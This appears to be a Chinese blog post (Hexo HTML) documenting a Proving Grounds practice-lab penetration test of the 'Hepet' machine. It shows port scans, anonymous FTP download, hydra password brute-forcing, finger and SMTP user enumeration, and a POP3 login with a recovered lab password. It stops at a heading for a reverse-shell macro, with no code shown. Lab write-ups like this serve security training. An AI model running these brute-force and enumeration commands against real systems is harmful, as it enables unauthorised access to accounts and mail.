@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+<meta name="baidu-site-verification" content="codeva-l4PbCwKc7Z">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="FEUc84rh7dgaXl_JOY_Bq7sulvZljH">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Monaco:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.thiiiiink.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":true,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Proving Grounds Practice Lab中Hepet打靶过程记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Proving Grounds Practice - Hepet">
+<meta property="og:url" content="https://www.thiiiiink.com/post/20250223233825.html">
+<meta property="og:site_name" content="临渊羡鱼">
+<meta property="og:description" content="Proving Grounds Practice Lab中Hepet打靶过程记录">
+<meta property="og:locale">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-117.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-115.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-118.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-114.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-119.png.png">
+<meta property="og:image" content="https://thiiiiink.com/202508/asynccode-116.png.png">
+<meta property="article:published_time" content="2025-02-23T15:38:25.000Z">
+<meta property="article:modified_time" content="2025-09-30T08:03:04.077Z">
+<meta property="article:author" content="Yiaos">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://thiiiiink.com/202508/asynccode-117.png.png">
+
+<link rel="canonical" href="https://www.thiiiiink.com/post/20250223233825.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>Proving Grounds Practice - Hepet | 临渊羡鱼</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-J67WGCEZY5"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-J67WGCEZY5');
+      }
+    </script>
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?257c5564d6a2b53ffc355cd89f5f2095";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta custom-logo">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">临渊羡鱼</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">退而结网</p>
+      <a>
+        <img class="custom-logo-image" src="/images/avatar.gif" alt="临渊羡鱼">
+      </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://www.thiiiiink.com/post/20250223233825.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Yiaos">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临渊羡鱼">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Proving Grounds Practice - Hepet
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-02-23 23:38:25" itemprop="dateCreated datePublished" datetime="2025-02-23T23:38:25+08:00">2025-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-09-30 16:03:04" itemprop="dateModified" datetime="2025-09-30T16:03:04+08:00">2025-09-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/" itemprop="url" rel="index"><span itemprop="name">What We Do-三天打鱼</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/" itemprop="url" rel="index"><span itemprop="name">OSCP</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/What-We-Do-%E4%B8%89%E5%A4%A9%E6%89%93%E9%B1%BC/OSCP/PG-Lab/" itemprop="url" rel="index"><span itemprop="name">PG Lab</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">Proving Grounds Practice Lab中Hepet打靶过程记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Meduim</p>
+<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><p>autorecon 192.168.184.140</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">[*] smtp found on tcp/<span class="number">25.</span></span><br><span class="line">    smtp Mercury/<span class="number">32</span> smtpd (Mail server account Maiser)</span><br><span class="line">    enum found login: admin</span><br><span class="line"></span><br><span class="line">[*] finger found on tcp/<span class="number">79.</span></span><br><span class="line">    Mercury/<span class="number">32</span> fingerd</span><br><span class="line">    Login: Admin </span><br><span class="line"></span><br><span class="line">[*] pop3pw found on tcp/<span class="number">106.</span></span><br><span class="line">    Mercury/<span class="number">32</span> poppass service</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] pop3 found on tcp/<span class="number">110.</span></span><br><span class="line">    Mercury/<span class="number">32</span> pop3d</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">135.</span></span><br><span class="line"></span><br><span class="line">[*] netbios-ssn found on tcp/<span class="number">139.</span></span><br><span class="line"></span><br><span class="line">[*] imap found on tcp/<span class="number">143.</span></span><br><span class="line">     Mercury/<span class="number">32</span> imapd <span class="number">4.62</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">443.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.46</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>g PHP/<span class="number">7.3</span><span class="number">.23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] microsoft-ds found on tcp/<span class="number">445.</span></span><br><span class="line">    smb</span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">8000.</span></span><br><span class="line">    Apache/<span class="number">2.4</span><span class="number">.46</span> (Win64)</span><br><span class="line">  </span><br><span class="line">[*] ph-addressbook found on tcp/<span class="number">105.</span></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/<span class="number">2224.</span></span><br><span class="line">    Mercury HTTP Services</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">5040.</span></span><br><span class="line"></span><br><span class="line">[*] vnc found on tcp/<span class="number">11100.</span></span><br><span class="line">    version: <span class="number">3.8</span></span><br><span class="line"></span><br><span class="line">[*] ftp found on tcp/<span class="number">20001.</span></span><br><span class="line">    FileZilla ftpd <span class="number">0.9</span><span class="number">.41</span> beta</span><br><span class="line">    Anonymous FTP login allowed</span><br><span class="line"></span><br><span class="line">[*] unknown found on tcp/<span class="number">33006.</span></span><br><span class="line">    MariaDB</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49664.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49665.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49666.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49667.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49668.</span></span><br><span class="line">[*] msrpc found on tcp/<span class="number">49669.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">things to <span class="keyword">try</span></span><br><span class="line">    - mail user: admin</span><br><span class="line">    <span class="number">2224</span> reset passwd</span><br><span class="line">    <span class="number">11110</span> vnc <span class="number">3.8</span></span><br><span class="line">    <span class="number">20001</span> ftp Anonymous FTP login allowed</span><br><span class="line">       vue-blog-demo v1<span class="number">.0</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line">    <span class="number">33006</span> MariaDB </span><br><span class="line"></span><br><span class="line">    <span class="number">8000</span> has /team /fonts maybe upload</span><br></pre></td></tr></table></figure>
+
+<h2 id="20001-ftp"><a href="#20001-ftp" class="headerlink" title="20001 ftp"></a>20001 ftp</h2><p>ftp可以匿名登录, 查看内容，看起来是网站的源码，使用lftp下载下来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">ftp -a -A <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> -P <span class="number">20001</span></span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>.</span><br><span class="line"><span class="number">220</span>-FileZilla Server version <span class="number">0.9</span><span class="number">.41</span> beta</span><br><span class="line"><span class="number">220</span>-written by Tim Kosse (Tim.Kosse@gmx.de)</span><br><span class="line"><span class="number">220</span> Please visit http://sourceforge.net/projects/filezilla/</span><br><span class="line"><span class="number">331</span> Password required <span class="keyword">for</span> anonymous</span><br><span class="line"><span class="number">230</span> Logged on</span><br><span class="line">Remote system <span class="built_in">type</span> <span class="keyword">is</span> UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line"><span class="number">200</span> Port command successful</span><br><span class="line"><span class="number">150</span> Opening data channel <span class="keyword">for</span> directory <span class="built_in">list</span>.</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">312</span> Oct <span class="number">20</span>  <span class="number">2020</span> .babelrc</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">147</span> Oct <span class="number">20</span>  <span class="number">2020</span> .editorconfig</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp             <span class="number">23</span> Oct <span class="number">20</span>  <span class="number">2020</span> .eslintignore</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">779</span> Oct <span class="number">20</span>  <span class="number">2020</span> .eslintrc.js</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">167</span> Oct <span class="number">20</span>  <span class="number">2020</span> .gitignore</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">228</span> Oct <span class="number">20</span>  <span class="number">2020</span> .postcssrc.js</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">346</span> Oct <span class="number">20</span>  <span class="number">2020</span> .tern-project</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> build</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> config</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">1376</span> Oct <span class="number">20</span>  <span class="number">2020</span> index.html</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp         <span class="number">425010</span> Oct <span class="number">20</span>  <span class="number">2020</span> package-lock.json</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">2454</span> Oct <span class="number">20</span>  <span class="number">2020</span> package.json</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp           <span class="number">1100</span> Oct <span class="number">20</span>  <span class="number">2020</span> README.md</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> src</span><br><span class="line">drwxr-xr-x <span class="number">1</span> ftp ftp              <span class="number">0</span> Oct <span class="number">20</span>  <span class="number">2020</span> static</span><br><span class="line">-r--r--r-- <span class="number">1</span> ftp ftp            <span class="number">127</span> Oct <span class="number">20</span>  <span class="number">2020</span> _redirects</span><br><span class="line"><span class="number">226</span> Transfer OK</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lftp -e <span class="string">&quot;mirror -c -e / ftp&quot;</span> ftp://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">20001</span></span><br></pre></td></tr></table></figure>
+
+<p>查看是cms: vue-blog-demo v1.0.0, 没有其他信息，并且8000用的好像也不是这个， 搜索FileZilla ftpd 0.9.41 beta 也没有可利用的已知漏洞</p>
+<h2 id="445-smbclient"><a href="#445-smbclient" class="headerlink" title="445 smbclient"></a>445 smbclient</h2><p>不支持匿名登录，使用扫出来的admin爆破下密码，没有结果</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span></span><br><span class="line">Hydra v9<span class="number">.5</span> (c) <span class="number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="keyword">not</span> use <span class="keyword">in</span> military <span class="keyword">or</span> secret service organizations, <span class="keyword">or</span> <span class="keyword">for</span> illegal purposes (this <span class="keyword">is</span> non-binding, these *** ignore laws <span class="keyword">and</span> ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="number">2025</span>-02-<span class="number">23</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">36</span></span><br><span class="line">[INFO] Reduced number of tasks to <span class="number">1</span> (smb does <span class="keyword">not</span> like parallel connections)</span><br><span class="line">[DATA] <span class="built_in">max</span> <span class="number">1</span> task per <span class="number">1</span> server, overall <span class="number">1</span> task, <span class="number">14344399</span> login tries (l:<span class="number">1</span>/p:<span class="number">14344399</span>), ~<span class="number">14344399</span> tries per task</span><br><span class="line">[DATA] attacking smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">445</span>/</span><br><span class="line">[ERROR] invalid reply <span class="keyword">from</span> target smb://<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>:<span class="number">445</span>/</span><br></pre></td></tr></table></figure>
+
+<h2 id="2224-mlss"><a href="#2224-mlss" class="headerlink" title="2224 mlss"></a>2224 mlss</h2><p>mailing list subscriber services, 有订阅和忘记密码功能，暂时没有可利用的点， 也搜不到mlss的已知漏洞</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-117.png.png"></p>
+<h2 id="79-finger"><a href="#79-finger" class="headerlink" title="79 finger"></a>79 finger</h2><p>使用finger-user-enum.pl 枚举用户名</p>
+<blockquote>
+<p>github: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/pentestmonkey/finger-user-enum">https://github.com/pentestmonkey/finger-user-enum</a></p>
+<p>工具是在walkThrough: <a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b">https://medium.com/@huwanyu94/proving-grounds-practice-hepet-walkthrough-ee7e051af47b</a> 中看到的</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> |grep -v <span class="string">&#x27;is not known&#x27;</span></span><br><span class="line">Starting finger-user-enum v1<span class="number">.0</span> ( http://pentestmonkey.net/tools/finger-user-enum )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">######## Scan started at Sun Feb 23 16:27:33 2025 #########</span></span><br><span class="line">admin@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: admin         Name: Mail System Administrator....[No profile information]..</span><br><span class="line">agnes@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: agnes         Name: Agnes....[No profile information]..</span><br><span class="line">charlotte@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: charlotte         Name: Charlotte....[No profile information]..</span><br><span class="line">jonas@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: jonas         Name: Jonas....[No profile information]..</span><br><span class="line">magnus@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: magnus         Name: Magnus....[No profile information]..</span><br><span class="line">martha@<span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>: Login: martha         Name: Martha....[No profile information]..</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mercury-32-mail"><a href="#Mercury-32-mail" class="headerlink" title="Mercury&#x2F;32 mail"></a>Mercury&#x2F;32 mail</h2><p>再枚举下用户名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra smtp-enum://<span class="number">192.168</span><span class="number">.180</span><span class="number">.140</span>:<span class="number">25</span>/expn -L <span class="string">&quot;/usr/share/seclists/Usernames/top-usernames-shortlist.txt&quot;</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>Mercury&#x2F;32 有缓冲区溢出漏洞，但是不知道版本号，测试了一个无法利用成功</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-115.png.png"></p>
+<h2 id="8000-443"><a href="#8000-443" class="headerlink" title="8000 &#x2F; 443"></a>8000 &#x2F; 443</h2><p>基本是静态网页，没有可交互的地方</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-118.png.png"></p>
+<p><code>Jonas K.</code>的介绍像是密码， 我没发现这个密码，看了hits才留意到。walkThrough使用了 html2markdown</p>
+<p><code>curl</code> <code>http://192.168.184.140:8000/|</code> <code>html2markdown &gt; html.md</code></p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-114.png.png"></p>
+<p>得到密码后第一想法是smbclient， 测试发现登录失败，ftp也不行，再次看了hits，登录邮箱</p>
+<p><img data-src="https://thiiiiink.com/202508/asynccode-119.png.png"><img data-src="https://thiiiiink.com/202508/asynccode-116.png.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span> <span class="number">110</span></span><br><span class="line">Trying <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>...</span><br><span class="line">Connected to <span class="number">192.168</span><span class="number">.184</span><span class="number">.140</span>.</span><br><span class="line">Escape character <span class="keyword">is</span> <span class="string">&#x27;^]&#x27;</span>.</span><br><span class="line">+OK &lt;<span class="number">14653593.7950</span>@localhost&gt;, POP3 server ready.</span><br><span class="line">user Jonas</span><br><span class="line">+OK Jonas <span class="keyword">is</span> known here.</span><br><span class="line"><span class="keyword">pass</span> SicMundusCreatusEst</span><br><span class="line">+OK Welcome! <span class="number">4</span> messages (<span class="number">4744</span> <span class="built_in">bytes</span>)</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">+OK</span><br><span class="line">Mercury/<span class="number">32</span> MTS Post Office Protocol v3 server v4<span class="number">.62</span>,</span><br><span class="line">Copyright (c) <span class="number">1993</span>-<span class="number">2008</span> David Harris.</span><br><span class="line">This server recognizes the following commands:</span><br><span class="line">  USER - login <span class="keyword">as</span> a user</span><br><span class="line">  PASS - specify a password</span><br><span class="line">  APOP - perform secure login</span><br><span class="line">  CAPA - RFC2449 capability discovery</span><br><span class="line">  STLS - Start TLS negotiation, <span class="keyword">if</span> enabled</span><br><span class="line">  STAT - show mailbox statistics</span><br><span class="line">  RETR - send a message</span><br><span class="line">  LIST - show message numbers <span class="keyword">and</span> sizes</span><br><span class="line">  DELE - delete a message</span><br><span class="line">  RSET - <span class="string">&#x27;undo&#x27;</span> <span class="built_in">all</span> mailbox changes</span><br><span class="line">  TOP  - show lines <span class="keyword">from</span> a message</span><br><span class="line">  QUIT - close the connection</span><br><span class="line">  NOOP, RPOP, LAST are also supported.</span><br><span class="line"></span><br><span class="line">Extended commands:</span><br><span class="line">  XTND XMIT  - Send a message via POP3</span><br><span class="line">  XTND XLST  - Eudora extended <span class="built_in">list</span> command</span><br><span class="line">  UIDL - <span class="keyword">return</span> unique identifier (RFC1725).</span><br><span class="line">.</span><br><span class="line"><span class="built_in">list</span> 查看所有邮件</span><br><span class="line">retr <span class="number">2</span>  查看具体内容</span><br></pre></td></tr></table></figure>
+
+<p>邮件内容是： 新来的PR要求大家把spreadsheet发给mailadmin; mainadmin告诉大家公司改用LibreOffice了，spreadsheet就是office中的excel,</p>
+<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><p>新建一个恶意的ods文件, 操作方式如下：</p>
+<blockquote>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html">https://books.libreoffice.org/en/GS70/GS7013-GettingStartedWithMacros.html</a></p>
+</blockquote>
+<p>反弹shell macros:</p>
